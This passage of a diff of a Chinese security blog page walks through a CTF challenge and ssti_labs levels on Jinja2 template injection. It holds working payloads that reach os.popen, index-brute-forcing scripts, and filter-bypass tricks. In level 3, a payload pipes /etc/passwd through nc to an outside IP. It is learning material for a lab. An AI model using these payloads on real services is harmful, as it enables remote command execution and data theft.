 <p>先保存filepath这样一个文件，<code>subprocess.check_output(command)</code>返回Linux命令行输出，然后再把filepath文件删除，那么这里的<code>file_check_res</code>就是<code>file -b &#123;filepath&#125;</code>的结果。往上看filepath其实就是将上传文件目录的绝对路径和该文件的文件名拼接起来来标定用户上传的这个文件在容器中的绝对位置。逻辑搞明白了，现在的重点就在于如何对一个文件使用<code>file -b</code> 命令后返回值中能回显我们所期望的值。动手操作下flie命令，发现其不会输出文件的内容只会输出其类型，</p>
-<p><img src="/2023/02/09/ssti/image-20230429034451879.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230429034451879.png"></p>
 <p>代码中的-b参数作用：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">-b 　#列出辨识结果时，不显示文件名称。<br></code></pre></td></tr></table></figure>
 
 <p>所以在文件名上动手脚的想法也破灭了（悲。</p>
-<p>卡住了，向大佬博客寻求帮助，去guthub查找file命令源码。第一个仓库点开。<img src="/2023/02/09/ssti/image-20230429191534591.png" srcset="/img/loading.gif" lazyload></p>
+<p>卡住了，向大佬博客寻求帮助，去guthub查找file命令源码。第一个仓库点开。<img src="/2023/02/09/ssti/image-20230429191534591.png"></p>
 <p>点开tests里面是各种针对该<code>file</code>命令的<a target="_blank" rel="noopener" href="https://github.com/file/file/tree/master/tests">测试结果</a></p>
-<p><img src="/2023/02/09/ssti/image-20230429191635511.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230429191635511.png"></p>
 <p>这8个分别分别是在文本中写入bash脚本的4种情况和对应的用<code>file</code>命令执行的输出结果，可以看出如果文本内容为<code>#!/usr/bin</code>开头的那么输出结果中会显示文本中的其他内容。</p>
-<p><img src="/2023/02/09/ssti/image-20230429191927593.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230429191927593.png"></p>
 <p>本地做测试：创建一个文本文件修改内容如下</p>
-<p><img src="/2023/02/09/ssti/image-20230429193849800.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230429193849800.png"></p>
 <p>测试结果如下：</p>
-<p><img src="/2023/02/09/ssti/image-20230429193915755.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230429193915755.png"></p>
 <p>显而易见，输出可控，可以进行模板渲染。新建一个文本文件内容如下，上传文件</p>
-<p><img src="/2023/02/09/ssti/image-20230429194117415.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="/2023/02/09/ssti/image-20230429194209528.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230429194117415.png"></p>
+<p><img src="/2023/02/09/ssti/image-20230429194209528.png"></p>
 <p>存在ssti漏洞，开始利用，调用os模块</p>
-<p><img src="/2023/02/09/ssti/image-20230429195640928.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="/2023/02/09/ssti/image-20230429195803084.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230429195640928.png"></p>
+<p><img src="/2023/02/09/ssti/image-20230429195803084.png"></p>
 <p>调用popen()方法。</p>
-<p><img src="/2023/02/09/ssti/image-20230429195958840.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230429195958840.png"></p>
 <p>上传文件，获取flag。</p>
 <hr>
 <h2 id="ssti-labs"><a href="#ssti-labs" class="headerlink" title="ssti_labs"></a>ssti_labs</h2><p>搭建踩的坑：</p>
@@ -454,16 +82,16 @@
 <p><code>chown your_username:your_username app.py</code>：将app.py的所有权转移到普通用户</p>
 <p><code>su - your_username</code>：用普通用户身份登录</p>
 <h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><p>漏洞存在</p>
-<p><img src="/2023/02/09/ssti/image-20230730212602385.png" srcset="/img/loading.gif" lazyload></p>
-<p><code>__class__</code>一个对象的类的引用，用于实例化对象，这里是字符串对象，<code>obj.__class__</code>返回该对象所属类，对于类本身，<code>Class.__class__</code>返回它的元类<img src="/2023/02/09/ssti/image-20230730212648721.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230730212602385.png"></p>
+<p><code>__class__</code>一个对象的类的引用，用于实例化对象，这里是字符串对象，<code>obj.__class__</code>返回该对象所属类，对于类本身，<code>Class.__class__</code>返回它的元类<img src="/2023/02/09/ssti/image-20230730212648721.png"></p>
 <p>当前类的基类，这里有三种获取方法，<code>__base__</code>(获取直接父类)，<code>__bases__</code>(<code>Class.__bases__</code>返回Class的元组，包含它的直接父类)，<code>__mro__</code>，<code>__mro__</code>方法返回一个类的方法解析顺序，其中的类是在方法解析的过程中在寻找父类时需要考虑的类。要注意获取到的对象是多个还是单个，下面使用<code>__subclasses__()</code>时要注意的</p>
-<p><img src="/2023/02/09/ssti/image-20230730212858437.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="/2023/02/09/ssti/image-20230730213654861.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="/2023/02/09/ssti/image-20230730213714396.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230730212858437.png"></p>
+<p><img src="/2023/02/09/ssti/image-20230730213654861.png"></p>
+<p><img src="/2023/02/09/ssti/image-20230730213714396.png"></p>
 <p>有这些类继承的方法，我们就可以从任何一个变量(字符串、数组，整型，配置(config)，甚至文件本身(self)等等)，回溯到最顶层基类（<code>&lt;class&#39;object&#39;&gt;</code>）中去，再获得到此基类所有实现的类，就可以获得到很多的类和方法了。</p>
 <p><code>__subclasses__()</code>方法，直接返回一个类的所有子类列表，我们已经在最顶层基类了，看<code>&lt;class&#39;object&#39;&gt;</code>下有哪些子类，很多，SSTI 的主要目的就是从这么多的子类中找出可以利用的类（一般是指读写文件或执行命令的类）加以利用。</p>
-<p><img src="/2023/02/09/ssti/image-20230730215716944.png" srcset="/img/loading.gif" lazyload></p>
-<p>可通过角标查看<img src="/2023/02/09/ssti/image-20230730215805610.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230730215716944.png"></p>
+<p>可通过角标查看<img src="/2023/02/09/ssti/image-20230730215805610.png"></p>
 <p>，在python2中，子类file类可直接用于读取文件：</p>
 <p>编写脚本寻找file类对应角标：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> html<span class="hljs-comment">#这里引入了html库是针对本题，运行返回网页内容是html实体，所以人为解码</span><br><br>url = <span class="hljs-string">&#x27;http://124.70.99.199:5001/level/1&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">300</span>):<br>    payload = <span class="hljs-string">&quot;&quot;&quot;&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[%s]&#125;&#125;&quot;&quot;&quot;</span>%i<br><br>    r = requests.post(url,data=&#123;<span class="hljs-string">&quot;code&quot;</span>:payload&#125;).text<br>    r = html.unescape(r)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;file&quot;</span> <span class="hljs-keyword">in</span> r:<br><br>        <span class="hljs-built_in">print</span>(i)<br>        <br><span class="hljs-comment">#这里假设寻找到file类位于50位</span><br></code></pre></td></tr></table></figure>
@@ -473,11 +101,11 @@
 <p>但是现在基本上都用py3，包括我的靶场，所以有另外一种读文件方式，我们可以用<code>&lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt;</code> 这个类去读取文件。微调脚本：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> html<span class="hljs-comment">#这里引入了html库是针对本题，运行返回网页内容是html实体，所以人为解码</span><br><br>url = <span class="hljs-string">&#x27;http://124.70.99.199:5001/level/1&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">300</span>):<br>    payload = <span class="hljs-string">&quot;&quot;&quot;&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[%s]&#125;&#125;&quot;&quot;&quot;</span>%i<br><br>    r = requests.post(url,data=&#123;<span class="hljs-string">&quot;code&quot;</span>:payload&#125;).text<br>    r = html.unescape(r)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;FileLoader&quot;</span> <span class="hljs-keyword">in</span> r:<br><br>        <span class="hljs-built_in">print</span>(i)<br>        <br><span class="hljs-comment">#这里寻找到file类位于79下标</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/2023/02/09/ssti/image-20230730225207888.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230730225207888.png"></p>
 <p><code>get_data</code>方法读文件：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">79</span>][<span class="hljs-string">&quot;get_data&quot;</span>](<span class="hljs-number">0</span>,<span class="hljs-string">&quot;/flag&quot;</span>)&#125;&#125;<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2023/02/09/ssti/image-20230730233526240.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230730233526240.png"></p>
 <p>玩点更有意思的，getshell</p>
 <p>内建函数：</p>
 <p>在python解释器启动时，即使没有创建任何变量或函数，无需导入任何模块，有很多函数可以使用，叫做内建函数</p>
@@ -493,22 +121,22 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> html<span class="hljs-comment">#这里引入了html库是针对本题，运行返回网页内容是html实体，所以人为解码</span><br><br>url = <span class="hljs-string">&#x27;http://124.70.99.199:5003/level/1&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">500</span>):<br>    payload = <span class="hljs-string">&quot;&quot;&quot;&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[%s].__init__.__globals__.__builtins__&#125;&#125;&quot;&quot;&quot;</span>%i<br>    evalClass = <span class="hljs-string">&quot;&quot;&quot;&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[%s]&#125;&#125;&quot;&quot;&quot;</span>%i<br>    r = requests.post(url,data=&#123;<span class="hljs-string">&quot;code&quot;</span>:payload&#125;).text<br>    evalclass_r = requests.post(url,data=&#123;<span class="hljs-string">&quot;code&quot;</span>:evalClass&#125;).text<br>    r = html.unescape(r)<br>    evalclass_r = html.unescape(evalclass_r)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;eval&quot;</span> <span class="hljs-keyword">in</span> r:<br><br>        <span class="hljs-built_in">print</span>(i,end=<span class="hljs-string">&#x27;\n&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(evalclass_r)<br>        <br></code></pre></td></tr></table></figure>
 
 <p>这里符合条件的子类也是相当多</p>
-<p><img src="/2023/02/09/ssti/image-20230731005556778.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230731005556778.png"></p>
 <p>相当多，我们随便取个数继续构造payload：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">399</span>].__init__.__globals__.__builtins__[<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)&#125;&#125;<br></code></pre></td></tr></table></figure>
 
 <p>后面发现不一定要使用<code>__builtins__</code>模块，还可以试试别的模块</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># __builtins__</span><br>&#123;&#123;().__class__.__base__.__subclasses__()[<span class="hljs-number">80</span>].__init__.__globals__.__builtins__[<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;cat flag&#x27;</span>).read()&#125;&#125;<br><span class="hljs-comment"># popen</span><br>&#123;&#123;().__class__.__base__.__subclasses__()[<span class="hljs-number">132</span>].__init__.__globals__[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;cat flag&#x27;</span>).read()&#125;&#125;<br><span class="hljs-comment"># os</span><br>&#123;&#123;().__class__.__base__.__subclasses__()[<span class="hljs-number">213</span>].__init__.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;cat flag&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2023/02/09/ssti/image-20230731012232999.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230731012232999.png"></p>
 <h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>被警告了</p>
-<p><img src="/2023/02/09/ssti/image-20230731021637628.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230731021637628.png"></p>
 <p>这样又没事</p>
-<p><img src="/2023/02/09/ssti/image-20230731021730919.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230731021730919.png"></p>
 <p>这样也可</p>
-<p><img src="/2023/02/09/ssti/image-20230731021752614.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230731021752614.png"></p>
 <p>左双括号被ban了</p>
-<p><img src="/2023/02/09/ssti/image-20230731021832024.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230731021832024.png"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;% ... %&#125; for Statements <br><br>&#123;&#123; ... &#125;&#125; for Expressions to print to the template output<br><br>&#123;# ... #&#125; for Comments not included in the template output<br><br>#  ... # for Line Statements<br></code></pre></td></tr></table></figure>
 
 <p>jinja2模板语法中可不止<code>&#123;&#123;&#125;&#125;</code>，还有<code>&#123;%%&#125;</code>，用于插入逻辑控制代码，<em><strong>其中的代码会在渲染模板时被执行</strong></em>，</p>
@@ -538,55 +166,55 @@
 <p>看别人博客时发现print居然也能写进来诶，自己想了想，既然能够执行为啥不能用print呢，</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;%print(&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[399].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /etc/passwd&#x27;).read()&quot;))%&#125;<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2023/02/09/ssti/image-20230731025126135.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230731025126135.png"></p>
 <h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>emmm，上面出了点小趣事，涉及到jinja2的渲染语句还是都打上代码块吧呜呜（，传博客的时候发现报错</p>
-<p><img src="/2023/02/09/ssti/image-20230731024741335.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230731024741335.png"></p>
 <p>，小问题，都打上代码块就好了</p>
 <p>输入1，</p>
-<p><img src="/2023/02/09/ssti/image-20230731030014042.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="/2023/02/09/ssti/image-20230731030026544.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230731030014042.png"></p>
+<p><img src="/2023/02/09/ssti/image-20230731030026544.png"></p>
 <p>只会显示语法正确与否，不会回显，那好办，上一题回带vps的payload直接拿下来用，</p>
 <p>payload：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;%if (&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[399].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /etc/passwd|nc 124.70.99.199 7890&#x27;).read()&quot;))%&#125;&#123;%endif%&#125;<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2023/02/09/ssti/image-20230731025728066.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230731025728066.png"></p>
 <p>还看到了别人的姿势，</p>
-<p><img src="/2023/02/09/ssti/image-20230731030517813.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230731030517813.png"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;% for i in &#x27;&#x27;.__class__.__mro__[-1].__subclasses__() %&#125;&#123;% if i.__name__==&#x27;Popen&#x27; %&#125;&#123;&#123; i.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /etc/passwd|nc 124.70.99.199 7890&#x27;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure>
 
 <h3 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h3><p>中括号被过滤了，<a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.1.x/templates/#variables">查Jinja官方文档</a>，variable开头就直接说了</p>
-<p><img src="/2023/02/09/ssti/image-20230731170423110.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230731170423110.png"></p>
 <p>你可以使用点（ <code>.</code> ）来访问变量的属性，作为替代，也可以使用所谓的“下标”语 法（<code>[]</code>），如果点被过滤，可以用中括号绕过。</p>
 <p>中括号被过滤了呢，这里的代码写出了一种特殊的方法<code>__getitem__</code>，用于获取foo中的item</p>
-<p><img src="/2023/02/09/ssti/image-20230731180156155.png" srcset="/img/loading.gif" lazyload>我们可以用<code>__getitem__()</code>来获取字典中的键值，看了别人的博客，知道pop()方法也可以取键值，但是会删除键，不到万不得已不要用</p>
+<p><img src="/2023/02/09/ssti/image-20230731180156155.png">我们可以用<code>__getitem__()</code>来获取字典中的键值，看了别人的博客，知道pop()方法也可以取键值，但是会删除键，不到万不得已不要用</p>
 <p>payload：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__().__getitem__(399).__init__.__globals__.__builtins__.__getitem__(&quot;__import__&quot;)(&#x27;os&#x27;).popen(&#x27;cat /etc/passwd&#x27;).read()&#125;&#125;<br><br>&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__().pop(399).__init__.__globals__.__builtins__.pop(&quot;__import__&quot;)(&#x27;os&#x27;).popen(&#x27;cat /etc/passwd&#x27;).read()&#125;&#125;<br><br>&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__().__getitem__(399).__init__.__globals__.get(&#x27;__builtins__&#x27;).__getitem__(&quot;__import__&quot;)(&#x27;os&#x27;).popen(&#x27;cat /etc/passwd&#x27;).read()&#125;&#125; ##get()返回指定键的值，如果值不在字典中返回default值<br><br>&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__().__getitem__(399).__init__.__globals__.setdefault(&#x27;__builtins__&#x27;).__getitem__(&quot;__import__&quot;)(&#x27;os&#x27;).popen(&#x27;cat /etc/passwd&#x27;).read()&#125;&#125;  ##setdefault(),和get()类似, 但如果键不存在于字典中，将会添加键并将值设为default<br></code></pre></td></tr></table></figure>
 
 <h3 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h3><p>单双引号被过滤</p>
-<p><img src="/2023/02/09/ssti/image-20230731183825048.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230731183825048.png"></p>
 <p>这个是真不会，去网上找别人的题解</p>
 <p>引号过滤有主要两种绕过方式：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">#方法一：request对象(jinja2)<br>&#123;&#123;1.__class__.__base__.__subclasses__()[64].__init__.__globals__.__builtins__[request.args.arg1](request.args.arg2).popen(request.args.arg3).read()&#125;&#125;<br>#然后GET传递a，b，c参数用于替代引号内的几样字符串<br>#?a=__import__&amp;b=os&amp;c=cat /etc/passwd<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2023/02/09/ssti/image-20230801020731807.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230801020731807.png"></p>
 <p><code>request.values</code>返回无论是GET还是POST请求的参数，当然flak框架内支持<code>request.form</code>用于传递post参数</p>
-<p><img src="/2023/02/09/ssti/image-20230801021306517.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="/2023/02/09/ssti/image-20230801021603150.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230801021306517.png"></p>
+<p><img src="/2023/02/09/ssti/image-20230801021603150.png"></p>
 <p>cookie中传参也可以</p>
-<p><img src="/2023/02/09/ssti/image-20230801021808956.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230801021808956.png"></p>
 <p>举一反三，看到别人的博客cookie可以塞，ua头里是不是也可以塞？去学了下jinja2获取ua头的方式(用法<code>request.user_agent.string</code>获取用户完整的ua字符串，<code>request.user_agent.browser</code>获取浏览器信息，<code>request.user_agent.platform</code>获取操作系统信息)，还真行</p>
-<p><img src="/2023/02/09/ssti/image-20230801023029680.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230801023029680.png"></p>
 <p>那自己创一个请求头也可以喽？还真行，真有意思</p>
-<p><img src="/2023/02/09/ssti/image-20230801023528609.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230801023528609.png"></p>
 <p>第二种方法，chr方法的利用，与python的chr()函数类似，用于将unicode编码转为对应字符，因为我们没法直接使用chr函数，所以需要通过<code>__builtins__</code>找到他，然后在<code>&#123;%%&#125;</code>中设置变量</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> html<span class="hljs-comment">#这里引入了html库是针对本题，运行返回网页内容是html实体，所以人为解码</span><br><br>url = <span class="hljs-string">&#x27;http://124.70.99.199:5003/level/1&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">500</span>):<br>    payload = <span class="hljs-string">&quot;&quot;&quot;&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__().__getitem__(%s).__init__.__globals__.__builtins__&#125;&#125;&quot;&quot;&quot;</span>%i<br>    evalClass = <span class="hljs-string">&quot;&quot;&quot;&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__().__getitem__(%s)&#125;&#125;&quot;&quot;&quot;</span>%i<br>    r = requests.post(url,data=&#123;<span class="hljs-string">&quot;code&quot;</span>:payload&#125;).text<br>    evalclass_r = requests.post(url,data=&#123;<span class="hljs-string">&quot;code&quot;</span>:evalClass&#125;).text<br>    r = html.unescape(r)<br>    evalclass_r = html.unescape(evalclass_r)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;chr&quot;</span> <span class="hljs-keyword">in</span> r:<br><br>        <span class="hljs-built_in">print</span>(i,end=<span class="hljs-string">&#x27;\n&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(evalclass_r)<br>        <br>  <span class="hljs-comment">#找到chr在第64个子类里</span><br></code></pre></td></tr></table></figure>
 
 <p><code>&#123;&#123;chr(65)&#125;&#125;</code>将渲染为‘A’，如下图</p>
-<p><img src="/2023/02/09/ssti/image-20230801030534571.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230801030534571.png"></p>
 <p>%2b(‘+’)用于连接两个字符</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;%set chr=1.__class__.__base__.__subclasses__()[64].__init__.__globals__.__builtins__.chr%&#125;&#123;&#123;1.__class__.__base__.__subclasses__()[64].__init__.__globals__.__builtins__[chr(95)%2bchr(95)%2bchr(105)%2bchr(109)%2bchr(112)%2bchr(111)%2bchr(114)%2bchr(116)%2bchr(95)%2bchr(95)](chr(111)%2bchr(115)).popen(chr(108)%2bchr(115)).read()&#125;&#125;<br>#等价于<br>&#123;%set chr=1.__class__.__base__.__subclasses__()[64].__init__.__globals__.__builtins__.chr%&#125;&#123;&#123;1.__class__.__base__.__subclasses__()[64].__init__.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;cat /etc/passwd&#x27;).read()&#125;&#125;<br>#这里一定注意import两端的下划线呜呜呜呜，忘记了这个模块有下划线，然后又是全都是ascii码好久都没发现<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2023/02/09/ssti/image-20230801034608529.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230801034608529.png"></p>
 <p>这样挨个对ascii码太麻烦了，写个python脚本</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;cat /etc/passwd&quot;</span><br><span class="hljs-keyword">for</span> index,char <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(<span class="hljs-built_in">str</span>):<br>    joinchr = <span class="hljs-string">&#x27;%2b&#x27;</span> <span class="hljs-keyword">if</span> index &lt; <span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>)-<span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;chr(&#123;&#125;)&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">ord</span>(char)),end=joinchr)<br>    <br><span class="hljs-comment">#output:chr(99)%2bchr(97)%2bchr(116)%2bchr(32)%2bchr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)</span><br><br></code></pre></td></tr></table></figure>
 
@@ -594,125 +222,125 @@
